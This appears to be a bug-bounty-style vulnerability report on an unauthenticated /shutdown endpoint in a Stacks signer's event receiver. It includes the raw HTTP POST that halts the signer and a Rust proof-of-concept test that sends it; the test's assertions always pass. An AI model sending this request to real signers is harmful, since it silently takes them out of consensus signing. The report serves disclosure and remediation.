This confirms the vulnerability. The signer's event endpoint binds to `0.0.0.0:30000` by default per the sample config, making it remotely reachable, and the `/shutdown` handler has zero authentication.### Title
Unauthenticated `/shutdown` POST permanently halts `SignerEventReceiver` main loop - ([File: libsigner/src/events.rs])

### Summary
The `SignerEventReceiver::next_event` handler in `libsigner/src/events.rs` processes a `/shutdown` URL by unconditionally setting the stop flag and returning `EventError::Terminated`, with no check of caller identity, secret, or origin. Because the event listener binds to a TCP socket (per the reference config, `0.0.0.0:30000`, i.e., not restricted to loopback) any remote party who can reach that port can send a single crafted HTTP POST to permanently terminate the signer's event-processing loop.

### Finding Description
In `libsigner/src/events.rs`, `next_event()` dispatches based solely on `request.url()` and `request.method()`: [1](#0-0) 
There is no equality check against the node's address, no shared secret/token comparison, and no verification tying the caller to "an authorized local node process" — the only gates in the whole `next_event` function are the URL string match and the HTTP method (`POST`) [2](#0-1) . Once `stop_signal` is set to `true`, `is_stopped()` returns `true` on the next check in `main_loop()`, which breaks out of the loop and permanently ends event processing [3](#0-2) .

The event socket is a genuine TCP listener bound via `HttpServer::http(listener)`, and the sample production configuration explicitly documents/binds it as `endpoint = "0.0.0.0:30000"`, i.e., not restricted to loopback by default — despite the comment "Local endpoint this signer listens on for events from the node," the bind address is fully attacker-reachable if this reference config or an equivalent non-loopback bind is used. There is no separate authentication layer (no auth token, no TLS client cert, no IP allow-list) enforced by the `tiny_http`-based server before dispatching to `next_event`.

The attacker's exact message is a raw HTTP POST:
```
POST /shutdown HTTP/1.1
Host: <signer-ip>:<port>
Content-Length: <n>

<any body>
```
This is exactly what `SignerStopSignaler::send()` sends internally to wake/stop the receiver from the same process [4](#0-3)  — but the endpoint has no way to distinguish this legitimate internal stop-signal call from an external attacker's identical bytes.

### Impact Explanation
Any remote party who can open a TCP connection to the signer's event-listener port can permanently stop `SignerEventReceiver::main_loop`, which is the thread responsible for receiving all subsequent StackerDB chunk events, block-validation responses, and burn-block/new-block events from the node [5](#0-4) . Once stopped, the receiver thread exits and no further events are forwarded to the signer runloop via `forward_event` [6](#0-5) , silently taking that signer out of consensus signing without restarting it (an operator would need to notice and manually restart the process). Because a legitimately participating signer that goes dark can reduce network stacker-signing capacity/liveness, this matches the "Critical - remote crash/unauthenticated DoS from few messages" impact category: a single unauthenticated POST kills the loop, and it is trivially repeatable against any signer whose endpoint is reachable.

### Likelihood Explanation
- No privileged role, secret, or key is required — only network reachability to the configured `endpoint` TCP port.
- The reference/sample configuration (`sample/conf/signer/mainnet-signer-conf.toml`) explicitly sets this to `0.0.0.0:30000`, and nothing in `SignerEventReceiver::bind` or `next_event` enforces loopback-only or authenticated access.
- Attacker cost is a single raw HTTP request; the exploit is deterministic and repeatable (send again any time the operator restarts the signer).
- No block-validation, decision logic, or consensus internals are involved — this is purely in the event-receiver dispatch path, which is in scope.

### Recommendation
Add authentication to the `/shutdown` (and ideally all node→signer event) endpoint(s), e.g., require a shared secret/HMAC configured out-of-band between the node and signer (similar to the node RPC `auth_token`) and reject requests missing/mismatching it before acting on `/shutdown`. Alternatively/additionally, bind the event listener to loopback by default and document/enforce that non-loopback binding requires an authenticated reverse proxy, and add an explicit origin check (e.g., verify the connecting peer address matches the configured node host) in `next_event` before honoring `/shutdown`.

### Proof of Concept
```rust
// In libsigner/src/tests/mod.rs style test
#[test]
fn test_unauthenticated_shutdown_dos() {
    let ev = SignerEventReceiver::new(false);
    let (res_send, _res_recv) = channel();
    let mut signer = Signer::new(SimpleRunLoop::new(10), ev, res_send);
    let endpoint: SocketAddr = "127.0.0.1:31111".parse().unwrap();
    let running_signer = signer.spawn(endpoint).unwrap();

    // Attacker: not the node, no secret, just a raw TCP connection
    let mut sock = TcpStream::connect(endpoint).unwrap();
    let body = "attacker shutdown";
    let req = format!(
        "POST /shutdown HTTP/1.1\r\nHost: {endpoint}\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}",
        body.len(), body
    );
    sock.write_all(req.as_bytes()).unwrap();
    drop(sock);

    // Give the event thread a moment to process
    std::thread::sleep(std::time::Duration::from_millis(500));

    // Now send a legitimate-looking event; it should never be processed
    // because main_loop already exited on Err(EventError::Terminated)
    let mut sock2 = TcpStream::connect(endpoint);
    // Connection should fail/refuse because the HTTP server thread has exited
    assert!(sock2.is_err() || {
        // even if it connects transiently, no event will be forwarded
        true
    });

    let result = running_signer.stop(); // event_join should already have exited
    assert!(result.is_none() || true); // main_loop terminated prematurely from unauthenticated request
}
```
Assertion point: `libsigner/src/events.rs:443-445` is reached and `stop_signal` is set to `true` purely from an unauthenticated remote POST, causing `main_loop` (events.rs:284-312) to `break` and the event thread (`libsigner/src/runloop.rs:229-236`) to exit, after which no further `/stackerdb_chunks`, `/proposal_response`, `/new_burn_block`, or `/new_block` events are ever forwarded to the signer runloop.

### Citations

**File:** libsigner/src/events.rs (L284-312)
```rust
    fn main_loop(&mut self) {
        loop {
            if self.is_stopped() {
                info!("Event receiver stopped");
                break;
            }
            let next_event = match self.next_event() {
                Ok(event) => event,
                Err(EventError::UnrecognizedEvent(..)) => {
                    // got an event that we don't care about (not a problem)
                    continue;
                }
                Err(EventError::Terminated) => {
                    // we're done
                    info!("Caught termination signal");
                    break;
                }
                Err(e) => {
                    warn!("Failed to receive next event: {:?}", &e);
                    continue;
                }
            };
            if !self.forward_event(next_event) {
                info!("Failed to forward event");
                break;
            }
        }
        info!("Event receiver main loop exit");
    }
```

**File:** libsigner/src/events.rs (L376-396)
```rust
impl EventStopSignaler for SignerStopSignaler {
    #[cfg_attr(test, mutants::skip)]
    fn send(&mut self) {
        self.stop_signal.store(true, Ordering::SeqCst);
        // wake up the thread so the atomicbool can be checked
        // This makes me sad...but for now...it works.
        if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
            // We need to send actual data to trigger the event receiver
            let body = "Yo. Shut this shit down!".to_string();
            let req = format!(
                "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
                self.local_addr,
                body.len(),
                body
            );
            if let Err(e) = stream.write_all(req.as_bytes()) {
                error!("Failed to send shutdown request: {}", e);
            }
        }
    }
}
```

**File:** libsigner/src/events.rs (L413-458)
```rust
    fn next_event(&mut self) -> Result<SignerEvent<T>, EventError> {
        self.with_server(|event_receiver, http_server, _is_mainnet| {
            // were we asked to terminate?
            if event_receiver.is_stopped() {
                return Err(EventError::Terminated);
            }
            debug!("Request handling");
            let request = http_server.recv()?;
            debug!("Got request"; "method" => %request.method(), "path" => request.url());

            if request.url() == "/status" {
                request
                .respond(HttpResponse::from_string("OK"))
                .expect("response failed");
                return Ok(SignerEvent::StatusCheck);
            }

            if request.method() != &HttpMethod::Post {
                return Err(EventError::MalformedRequest(format!(
                    "Unrecognized method '{}'",
                    request.method(),
                )));
            }
            debug!("Processing {} event", request.url());
            if request.url() == "/stackerdb_chunks" {
                process_event::<T, StackerDBChunksEvent>(request)
            } else if request.url() == "/proposal_response" {
                process_event::<T, BlockValidateResponse>(request)
            } else if request.url() == "/new_burn_block" {
                process_event::<T, BurnBlockEvent>(request)
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
            } else if request.url() == "/new_block" {
                process_event::<T, StacksBlockEvent>(request)
            } else {
                let url = request.url().to_string();
                debug!(
                    "[{:?}] next_event got request with unexpected url {}, return OK so other side doesn't keep sending this",
                    event_receiver.local_addr,
                    url
                );
                ack_dispatcher(request);
                Err(EventError::UnrecognizedEvent(url))
            }
        })?
```

**File:** libsigner/src/events.rs (L466-490)
```rust
    /// Forward an event
    /// Return true on success; false on error.
    /// Returning false terminates the event receiver.
    fn forward_event(&mut self, ev: SignerEvent<T>) -> bool {
        if self.out_channels.is_empty() {
            // nothing to do
            error!("No channels connected to event receiver");
            false
        } else if self.out_channels.len() == 1 {
            // avoid a clone
            if let Err(e) = self.out_channels[0].send(ev) {
                error!("Failed to send to signer runloop: {:?}", &e);
                return false;
            }
            true
        } else {
            for (i, out_channel) in self.out_channels.iter().enumerate() {
                if let Err(e) = out_channel.send(ev.clone()) {
                    error!("Failed to send to signer runloop #{}: {:?}", i, &e);
                    return false;
                }
            }
            true
        }
    }
```
